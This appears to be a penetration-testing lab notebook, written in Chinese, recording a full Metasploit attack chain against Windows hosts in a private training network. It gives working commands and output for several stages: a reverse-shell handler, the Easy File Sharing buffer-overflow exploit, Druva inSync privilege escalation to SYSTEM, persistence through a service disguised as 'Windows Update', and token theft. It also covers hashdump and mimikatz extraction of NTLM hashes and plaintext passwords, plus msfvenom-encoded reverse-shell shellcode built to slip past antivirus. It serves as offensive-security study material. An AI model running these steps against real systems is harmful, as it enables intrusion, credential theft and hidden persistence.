# GSS Metasploit
## Info
**Attacker:** `10.5.0.8` (digistudent1)
**Target:** `10.5.0.4` (digiserver1)、
`10.5.0.13` (digiserver3)(防毒: `Microsoft Security Essentials`)

## Handler
執行完進行監聽的cmd後，用makerc來save到腳本檔，
方便日後用`msfconsole -r gss_handler.rc`自動化設置handler
```
workspace gss
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.5.0.8
set LPORT 4444
set ExitOnSession false
exploit -j -z
set LPORT 443
exploit -j -z
makerc gss_handler.rc
```

## Get Meterpreter
### After Nmap Scan
```jav
msf6 > workspace gss
[*] Workspace: gss
msf6 > hosts

Hosts
=====

address   mac                name         os_name    os_flavor  os_sp  purpose  info  comments
-------   ---                ----         -------    ---------  -----  -------  ----  --------
10.5.0.4  12:34:56:78:9a:bc  DIGISERVER1  Windows 7                    client

msf6 > services
Services
========

host      port   proto  name                 state     info
----      ----   -----  ----                 -----     ----
10.5.0.4  21     tcp    ftp                  open      Microsoft ftpd
10.5.0.4  80     tcp    http                 open      Microsoft IIS httpd 7.5
10.5.0.4  135    tcp    msrpc                open      Microsoft Windows RPC
10.5.0.4  139    tcp    netbios-ssn          open      Microsoft Windows netbios-ssn
10.5.0.4  443    tcp    ssl/http             open      Microsoft IIS httpd 7.5
10.5.0.4  445    tcp    microsoft-ds         open
10.5.0.4  1433   tcp    ms-sql-s             open      Microsoft SQL Server 2008 R2 10.50.6592
10.5.0.4  3389   tcp    ssl/ms-wbt-server    open
10.5.0.4  5985   tcp    http                 open      Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.5.0.4  8080   tcp    http                 open      Easy File Sharing Web Server httpd 6.9
10.5.0.4  8081   tcp    ssl/blackice-icecap  open
10.5.0.4  47001  tcp    http                 open      Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.5.0.4  49152  tcp    msrpc                open      Microsoft Windows RPC
10.5.0.4  49153  tcp    msrpc                open      Microsoft Windows RPC
10.5.0.4  49154  tcp    msrpc                open      Microsoft Windows RPC
10.5.0.4  49155  tcp    msrpc                open      Microsoft Windows RPC
10.5.0.4  49157  tcp    msrpc                open      Microsoft Windows RPC
10.5.0.4  49158  tcp    msrpc                open      Microsoft Windows RPC
10.5.0.4  49159  tcp    msrpc                open      Microsoft Windows RPC
10.5.0.4  56620  tcp                         filtered

msf6 > vulns

Vulnerabilities
===============

Timestamp                Host      Name                                                    References
---------                ----      ----                                                    ----------
2022-08-31 06:13:07 UTC  10.5.0.4  Easy File Sharing HTTP Server 7.2 POST Buffer Overflow  EDB-42186
2022-08-31 06:18:55 UTC  10.5.0.4  Generic Payload Handler

msf6 > analyze
[*] Analysis for 10.5.0.4 ->
[*]   exploit/windows/http/easyfilesharing_post - ready for testing
```

### Easy File Sharing Exploit(RCE)
```javascript!
msf6 > use exploit/windows/http/easyfilesharing_post
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/easyfilesharing_post) > options

Module options (exploit/windows/http/easyfilesharing_post):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   80               yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.5.0.8         yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Easy File Sharing 7.2 HTTP


msf6 exploit(windows/http/easyfilesharing_post) > set RHOSTS 10.5.0.4
RHOSTS => 10.5.0.4
msf6 exploit(windows/http/easyfilesharing_post) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/easyfilesharing_post) > exploit

[*] Started reverse TCP handler on 10.5.0.8:4444
[*] Sending stage (175686 bytes) to 10.5.0.4
[*] Sending stage (175686 bytes) to 10.5.0.4
[*] Meterpreter session 1 opened (10.5.0.8:4444 -> 10.5.0.4:54576) at 2022-08-31 06:27:14 +0000

meterpreter >
```

## Privilege Escalation
看使用者已install的applications
```jav
meterpreter > run post/windows/gather/enum_applications

[*] Enumerating applications installed on DIGISERVER1

Installed Applications
======================

 Name                                                                                      Version
 ----                                                                                      -------
 7-Zip 22.00 (x64)                                                                         22.00
 Angry IP Scanner                                                                          3.8.2
 ClickOnce Bootstrapper Package for Microsoft .NET Framework                               4.8.09037
 CrossChex Standard                                                                        1.1.0.0
 DiagnosticsHub_CollectionService                                                          17.3.32601
 Druva inSync 6.5.2
 ```
 
 Search for Druva Sync Exploit
 ```jav
 msf6 exploit(multi/handler) > search druva

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc  2020-02-25       excellent  Yes    Druva inSync inSyncCPHwnet64.exe RPC Type 5 Privilege Escalation


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc

msf6 exploit(multi/handler) > use 0
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) > options

Module options (exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) > set LHOST 10.5.0.8
LHOST => 10.5.0.8
msf6 exploit(windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc) > exploit

[*] Started reverse TCP handler on 10.5.0.8:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Service 'inSyncCPHService' exists.
[*] Connecting to 127.0.0.1:6064 ...
[*] Sending packet (264 bytes) to 127.0.0.1:6064 ...
[*] Sending stage (175686 bytes) to 10.5.0.4
[*] Meterpreter session 3 opened (10.5.0.8:4444 -> 10.5.0.4:55669) at 2022-08-31 06:43:51 +0000
[*] Meterpreter session 4 opened (10.5.0.8:4444 -> 10.5.0.4:55960) at 2022-08-31 06:44:19 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
 ```
 
## Persistence
Refer - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
 
在拿到SYSTEM權限後，設定開機自動執行服務，趨時後門將以SYSTEM權限執行

 ```java
 msf6 exploit(windows/local/persistence_service) > set service_name "Windows Update"
service_name => Windows Update
msf6 exploit(windows/local/persistence_service) > set REMOTE_EXE_NAME WindowsUpdate
REMOTE_EXE_NAME => WindowsUpdate
msf6 exploit(windows/local/persistence_service) > set REMOTE_EXE_PATH C:\\Windows\\System32
REMOTE_EXE_PATH => C:\Windows\System32
msf6 exploit(windows/local/persistence_service) > set SERVICE_DESCRIPTION Windows Update Service
SERVICE_DESCRIPTION => Windows Update Service
msf6 exploit(windows/local/persistence_service) > set service_name Windows Update
service_name => Windows Update
msf6 exploit(windows/local/persistence_service) > exploit

[-] Handler failed to bind to 10.5.0.8:443:-  -
[-] Handler failed to bind to 0.0.0.0:443:-  -
[*] Running module against DIGISERVER1
[+] Meterpreter service exe written to C:\Windows\System32\WindowsUpdate.exe
[*] Creating service Windows Update
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/DIGISERVER1_20220902.5146/DIGISERVER1_20220902.5146.rc
[*] Sending stage (175686 bytes) to 10.5.0.4
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/persistence_service) > [*] Meterpreter session 1121 opened (10.5.0.8:443 -> 10.5.0.4:49665) at 2022-09-02 09:52:32 +0000
 ```
 
 
 ## 蒐集各種資訊存到DB
 使用各種modules讓metasploit自動存資料到DB
 
 ### Spool
 為了方便做筆記，紀錄History到檔案
 ```java
 msf6 exploit(multi/handler) > spool metasploit.log                                                                      │·····
[*] Spooling to file metasploit.log...
 ```
 
 ### 身分
 #### Migrate
 用`migrate`會無法回復原本的SESSION使用者權限
 ```java
 meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ps | explorer
Filtering on 'explorer'

Process List
============

 PID   PPID  Name          Arch  Session  User                     Path
 ---   ----  ----          ----  -------  ----                     ----
 4556  5564  explorer.exe  x64   3        DIGISERVER1\digiserver1  C:\windows\Explorer.EXE
 5312  5260  explorer.exe  x64   2        DIGISERVER1\user2        C:\windows\Explorer.EXE

meterpreter > migrate 4556
[*] Migrating from 6548 to 4556...
[*] Migration completed successfully.
meterpreter > getuid
Server username: DIGISERVER1\digiserver1
meterpreter > rev2self
meterpreter > getuid
Server username: DIGISERVER1\digiserver1
meterpreter >
 ```
 
#### Token
用`steal_token`冒用使用者身分，
可用`drop_token`回到SYSTEM身分。

```bash
 meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ps | explor
Filtering on 'explor'

Process List
============

 PID   PPID  Name          Arch  Session  User                     Path
 ---   ----  ----          ----  -------  ----                     ----
 4556  5564  explorer.exe  x64   3        DIGISERVER1\digiserver1  C:\windows\Explorer.EXE
 5312  5260  explorer.exe  x64   2        DIGISERVER1\user2        C:\windows\Explorer.EXE

meterpreter > steal_token 4556
Stolen token with username: DIGISERVER1\digiserver1
meterpreter > getuid
Server username: DIGISERVER1\digiserver1
meterpreter > drop_token
Relinquished token, now running as: DIGISERVER1\digiserver1
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
 ```

 ### HashDump
 可用於Pass The Hash
 ```jav
meterpreter > ps | winlogon
Filtering on 'winlogon'

Process List
============

 PID   PPID  Name          Arch  Session  User                 Path
 ---   ----  ----          ----  -------  ----                 ----
 516   476   winlogon.exe  x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
 2656  2220  winlogon.exe  x64   2        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
 2876  2580  winlogon.exe  x64   3        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe

meterpreter > migrate 516
[*] Migrating from 5628 to 516...
[*] Migration completed successfully.
meterpreter > hashdump
admin:1020:aad3b435b51404eeaad3b435b51404ee:69ebc5f192ab7397d7e135badb902328:::
digiserver1:500:aad3b435b51404eeaad3b435b51404ee:844b82c960c4ad0374ffb86328a8087f:::
digiStudent1:1021:aad3b435b51404eeaad3b435b51404ee:844b82c960c4ad0374ffb86328a8087f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user1:1022:aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72:::
user2:1023:aad3b435b51404eeaad3b435b51404ee:0229a7a4cd52062d9480fb4dbe41d41a:::
meterpreter >
```

### Sysinfo
```p!
meterpreter > sysinfo
Computer        : DIGISERVER1
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 4
Meterpreter     : x64/windows
```

### Kiwi
利用`wdigest`拿系統使用者明文密碼
```p
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > help kiwi

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)


meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain       NTLM                              SHA1
--------     ------       ----                              ----
admin        DIGISERVER1  69ebc5f192ab7397d7e135badb902328  731c54d337ca6f11947ff89525fbcd1565bbb4ae
digiserver1  DIGISERVER1  844b82c960c4ad0374ffb86328a8087f  3c74b55d0f33d38833fb3b08de84edfb788dc460

wdigest credentials
===================

Username      Domain       Password
--------      ------       --------
(null)        (null)       (null)
DIGISERVER1$  WORKGROUP    (null)
admin         DIGISERVER1  GSS%azure$1
digiserver1   DIGISERVER1  digiSERVER1gss^%%

kerberos credentials
====================

Username               Domain       Password
--------               ------       --------
(null)                 (null)       (null)
SqlIaaSExtensionQuery  NT Service   (null)
admin                  DIGISERVER1  (null)
digiserver1            DIGISERVER1  (null)
digiserver1$           WORKGROUP    (null)
```

### Exploit Suggester
```bash!
run post/multi/recon/local_exploit_suggester
```

```javascript
 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------                             1   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ikeext_service                           Yes                      The target appears to be vulnerable.     3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.                                                                                                                           4   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.     7   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.                                                                                                                           8   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
```

第二次跑
```bash
[*] Running check method for exploit 41 / 41
[*] 10.5.0.4 - Valid modules for session 8:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerab                                                                le.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerab                                                                le.
 3   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerab                                                                le.
 4   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerab                                                                le.
 5   exploit/windows/local/ikeext_service                           Yes                      The target appears to be vulnerab                                                                le.
 6   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could                                                                 not be validated.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerab                                                                le.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerab                                                                le.
 9   exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerab                                                                le.
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could                                                                 not be validated.
```


## Db Related Commands
### Hosts
```bash
msf6 exploit(multi/handler) > hosts 10.5.0.4

Hosts
=====

address   mac                name         os_name    os_flavor  os_sp  purpose  info  comments
-------   ---                ----         -------    ---------  -----  -------  ----  --------
10.5.0.4  12:34:56:78:9a:bc  DIGISERVER1  Windows 7                    client
```

### Creds
```bash
msf6 exploit(multi/handler) > creds 10.5.0.4
Credentials
===========

host      origin    service                 public        private                                                            realm        private_type  JtR Format
----      ------    -------                 ------        -------                                                            -----        ------------  ----------
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  digiserver1   aad3b435b51404eeaad3b435b51404ee:844b82c960c4ad0374ffb86328a8087f  DIGISERVER1  NTLM hash     nt,lm
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  digiserver1   digiSERVER1gss^%%                                                  DIGISERVER1  Password
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  admin         aad3b435b51404eeaad3b435b51404ee:69ebc5f192ab7397d7e135badb902328  DIGISERVER1  NTLM hash     nt,lm
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  admin         GSS%azure$1                                                        DIGISERVER1  Password
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  Guest         aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0               NTLM hash     nt,lm
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  user2         aad3b435b51404eeaad3b435b51404ee:0229a7a4cd52062d9480fb4dbe41d41a               NTLM hash     nt,lm
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  user1         aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72               NTLM hash     nt,lm
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  digiStudent1  aad3b435b51404eeaad3b435b51404ee:844b82c960c4ad0374ffb86328a8087f               NTLM hash     nt,lm
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  digiserver1   aad3b435b51404eeaad3b435b51404ee:844b82c960c4ad0374ffb86328a8087f               NTLM hash     nt,lm
10.5.0.4  10.5.0.4  445/tcp (microsoft-ds)  admin         aad3b435b51404eeaad3b435b51404ee:69ebc5f192ab7397d7e135badb902328               NTLM hash     nt,lm
```

### Services
```bash
msf6 exploit(multi/handler) > services 10.5.0.4
Services
========

host      port   proto  name               state     info
----      ----   -----  ----               -----     ----
10.5.0.4  21     tcp    ftp                open      Microsoft ftpd
10.5.0.4  80     tcp    http               open      Microsoft IIS httpd 7.5
10.5.0.4  135    tcp    msrpc              open      Microsoft Windows RPC
10.5.0.4  139    tcp    netbios-ssn        open      Microsoft Windows netbios-ssn
10.5.0.4  443    tcp    ssl/http           open      Microsoft IIS httpd 7.5
10.5.0.4  445    tcp    microsoft-ds       open
10.5.0.4  1433   tcp    ms-sql-s           open      Microsoft SQL Server 2008 R2 10.50.6592
10.5.0.4  3389   tcp    ssl/ms-wbt-server  open
10.5.0.4  5985   tcp    http               open      Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.5.0.4  8080   tcp    http-proxy         open      Easy File Sharing Web Server httpd 6.9
10.5.0.4  8081   tcp    blackice-icecap    open
10.5.0.4  47001  tcp    http               open      Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.5.0.4  49152  tcp    msrpc              open      Microsoft Windows RPC
10.5.0.4  49153  tcp    msrpc              open      Microsoft Windows RPC
10.5.0.4  49154  tcp    msrpc              open      Microsoft Windows RPC
10.5.0.4  49155  tcp    msrpc              open      Microsoft Windows RPC
10.5.0.4  49157  tcp    msrpc              open      Microsoft Windows RPC
10.5.0.4  49158  tcp    msrpc              open      Microsoft Windows RPC
10.5.0.4  49159  tcp    msrpc              open      Microsoft Windows RPC
10.5.0.4  49160  tcp    msrpc              open      Microsoft Windows RPC
10.5.0.4  56620  tcp                       filtered
```

### Vulns
```bash
msf6 exploit(multi/handler) > vulns 10.5.0.4

Vulnerabilities
===============

Timestamp                Host      Name                                                              References
---------                ----      ----                                                              ----------
2022-08-31 06:13:07 UTC  10.5.0.4  Easy File Sharing HTTP Server 7.2 POST Buffer Overflow            EDB-42186
2022-08-31 06:18:55 UTC  10.5.0.4  Generic Payload Handler
2022-08-31 06:43:50 UTC  10.5.0.4  Druva inSync inSyncCPHwnet64.exe RPC Type 5 Privilege Escalation  CVE-2019-3999,CVE-2020-5752,EDB-48400,EDB-48505,EDB-49211,PACKETSTORM-157493,PACKETSTOR
                                                                                                     M-157802,PACKETSTORM-160404,URL-https://www.tenable.com/security/research/tra-2020-12,U
                                                                                                     RL-https://www.tenable.com/security/research/tra-2020-34,URL-https://github.com/tenable
                                                                                                     /poc/blob/master/druva/inSync/druva_win_cphwnet64.py,URL-https://www.matteomalvica.com/
                                                                                                     blog/2020/05/21/lpe-path-traversal/
2022-08-31 08:07:46 UTC  10.5.0.4  Microsoft Windows DrawIconEx OOB Write Local Privilege Elevation  CVE-2020-1054,URL-https://cpr-zero.checkpoint.com/vulns/cprid-2153/,URL-https://0xeb-bp
                                                                                                     .com/blog/2020/06/15/cve-2020-1054-analysis.html,URL-https://github.com/DreamoneOnly/20
                                                                                                     20-1054/blob/master/x64_src/main.cpp,URL-https://github.com/KaLendsi/CVE-2020-1054/blob
                                                                                                     /master/CVE-2020-1054/exploit.cpp,URL-https://github.com/Iamgublin/CVE-2020-1054/blob/m
                                                                                                     aster/ConsoleApplication4.cpp
```

### Analyze
```bash
msf6 exploit(multi/handler) > analyze 10.5.0.4
[*] Analysis for 10.5.0.4 ->
[*]   exploit/windows/http/easyfilesharing_post - ready for testing
[*]   exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc - open meterpreter session required
[*]   exploit/windows/local/cve_2020_1054_drawiconex_lpe - open meterpreter session required
```

### Loot
所有目標已儲存資訊都可用Loot撈
![](https://i.imgur.com/Xj1Tmwn.png)


### Db Export
可將WorkSpace的DB資料dump出來存到XML，
供之後Import
```bash!
msf6 exploit(multi/handler) > db_export gss_msf_db
[*] Starting export of workspace gss to gss_msf_db [ xml ]...
[*] Finished export of workspace gss to gss_msf_db [ xml ]...
```

## StdAPI
### Screenshare
在System層級，可抓取系統使用者登入畫面
![](https://i.imgur.com/TxDIYM0.jpg)

**Screen、Keylogger、Audio、Webcam、events...等，
皆運用到StdApi，這裡不多贅述。**


## Av Evasion
### 前情提要
**Target:** `10.5.0.13`
因為Digiserver3有`Microsoft`防毒，用它來測試

### Recon
```bash
msf6 exploit(multi/handler) > db_nmap -sV -Pn -T5 10.5.0.13
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 02:32 UTC
[*] Nmap: Nmap scan report for digiserver3.internal.cloudapp.net (10.5.0.13)
[*] Nmap: Host is up (0.0010s latency).
[*] Nmap: Not shown: 985 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE              VERSION
[*] Nmap: 80/tcp    open  http                 Microsoft IIS httpd 7.5
[*] Nmap: 135/tcp   open  msrpc                Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
[*] Nmap: 443/tcp   open  https?
[*] Nmap: 445/tcp   open  microsoft-ds?
[*] Nmap: 1433/tcp  open  ms-sql-s             Microsoft SQL Server 2008 R2 10.50.6592
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 8080/tcp  open  http                 Easy File Sharing Web Server httpd 6.9
[*] Nmap: 8081/tcp  open  ssl/blackice-icecap?
[*] Nmap: 49152/tcp open  msrpc                Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc                Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc                Microsoft Windows RPC
[*] Nmap: 49157/tcp open  msrpc                Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc                Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc                Microsoft Windows RPC
[*] Nmap: MAC Address: 12:34:56:78:9A:BC (Unknown)
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 68.69 seconds
```

### 手動(不用metasploit)
#### Exploit Search
Easy File Sharing Web Server httpd 6.9
```bash
┌──(root㉿kali)-[~]
└─# searchsploit easy file sharing
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
BadBlue 2.5 - Easy File Sharing Remote Buffer Overflow                                      | windows/remote/845.c
Easy File Sharing FTP Server 2.0 (Windows 2000 SP4) - 'PASS' Remote Overflow                | windows/remote/3579.py
Easy File Sharing FTP Server 2.0 - 'PASS' Remote                                            | windows/remote/2234.py
Easy File Sharing FTP Server 2.0 - PASS Overflow (Metasploit)                               | windows/remote/16742.rb
Easy File Sharing FTP Server 3.5 - Remote Stack Buffer Overflow                             | windows/remote/33538.py
Easy File Sharing HTTP Server 7.2 - POST Buffer Overflow (Metasploit)                       | windows/remote/42256.rb
Easy File Sharing HTTP Server 7.2 - Remote Overflow (SEH) (Metasploit)                      | windows/remote/39661.rb
Easy File Sharing Web Server 1.2 - Information Disclosure                                   | windows/remote/23222.txt
Easy File Sharing Web Server 1.25 - Denial of Service                                       | windows/dos/423.pl
Easy File Sharing Web Server 1.3x/4.5 - Directory Traversal / Multiple Information Disclosu | multiple/dos/30856.txt
Easy File Sharing Web Server 3.2 - Format String Denial of Service                          | windows/dos/27377.txt
Easy File Sharing Web Server 3.2 - Full Path Request Arbitrary File Upload                  | windows/remote/27378.txt
Easy File Sharing Web Server 4 - Remote Information Stealer                                 | windows/remote/2690.c
Easy File Sharing Web Server 4.8 - File Disclosure                                          | windows/remote/8155.txt
Easy File Sharing Web Server 5.8 - Multiple Vulnerabilities                                 | windows/remote/17063.txt
Easy File Sharing Web Server 6.8 - Persistent Cross-Site Scripting                          | php/webapps/35626.txt
Easy File Sharing Web Server 6.8 - Remote Stack Buffer Overflow                             | windows/remote/33352.py
Easy File Sharing Web Server 6.9 - USERID Remote Buffer Overflow                            | windows/remote/37951.py
Easy File Sharing Web Server 7.2 - 'New User' Local Overflow (SEH)                          | windows/local/47411.py
Easy File Sharing Web Server 7.2 - 'POST' Remote Buffer Overflow                            | windows/remote/42165.py
Easy File Sharing Web Server 7.2 - 'POST' Remote Buffer Overflow (DEP Bypass)               | windows/remote/42186.py
Easy File Sharing Web Server 7.2 - 'UserID' Remote Buffer Overflow (DEP Bypass)             | windows/remote/44522.py
Easy File Sharing Web Server 7.2 - Account Import Local Buffer Overflow (SEH)               | windows/local/42267.py
Easy File Sharing Web Server 7.2 - Authentication Bypass                                    | windows/remote/42159.txt
Easy File Sharing Web Server 7.2 - GET 'PassWD' Remote Buffer Overflow (DEP Bypass)         | windows/remote/42304.py
Easy File Sharing Web Server 7.2 - GET 'PassWD' Remote Buffer Overflow (SEH)                | windows/remote/42261.py
Easy File Sharing Web Server 7.2 - GET Buffer Overflow (SEH)                                | windows/remote/39008.py
Easy File Sharing Web Server 7.2 - HEAD Request Buffer Overflow (SEH)                       | windows/remote/39009.py
Easy File Sharing Web Server 7.2 - Remote Buffer Overflow (SEH) (DEP Bypass + ROP)          | windows/remote/38829.py
Easy File Sharing Web Server 7.2 - Remote Overflow (Egghunter) (SEH)                        | windows/remote/40178.py
Easy File Sharing Web Server 7.2 - Remote Overflow (SEH)                                    | windows/remote/38526.py
Easy File Sharing Web Server 7.2 - Stack Buffer Overflow                                    | windows/remote/44485.py
Easy File Sharing Web Server 7.2 - Unrestricted File Upload                                 | windows/webapps/42268.py
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

**選擇: `42186.py`**
```bash!
┌──(root㉿kali)-[~]
└─# searchsploit -m 42186.py
  Exploit: Easy File Sharing Web Server 7.2 - 'POST' Remote Buffer Overflow (DEP Bypass)
      URL: https://www.exploit-db.com/exploits/42186
     Path: /usr/share/exploitdb/exploits/windows/remote/42186.py
File Type: Python script, ASCII text executable
```

**生成shellcode**:
```bash!
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.5.0.8 LPORT=4444 -e x86/alpha_mixed -v shellcode -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 769 (iteration=0)
x86/alpha_mixed chosen with final size 769
Payload size: 769 bytes
Final size of python file: 4283 bytes
shellcode =  b""
shellcode += b"\xdb\xc4\xd9\x74\x24\xf4\x5d\x55\x59\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += b"\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30"
...
```

**更改POC腳本**
```java!
vi 42186.py
```

**Exploit**
```bash!
┌──(root㉿kali)-[~]
└─# python2 42186.py 10.5.0.13
```

**Listener**
```bash!
┌──(root㉿kali)-[/usr/share/seclists/Discovery/DNS]
└─# rlwrap -cAr nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.5.0.13 49278
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\windows\system32>whoami
whoami
digiserver3\user1

C:\windows\system32>
```

#### Privilege Escalation
在TaskList裡發現`Druva`
```cmd
C:\windows\system32>tasklist /V

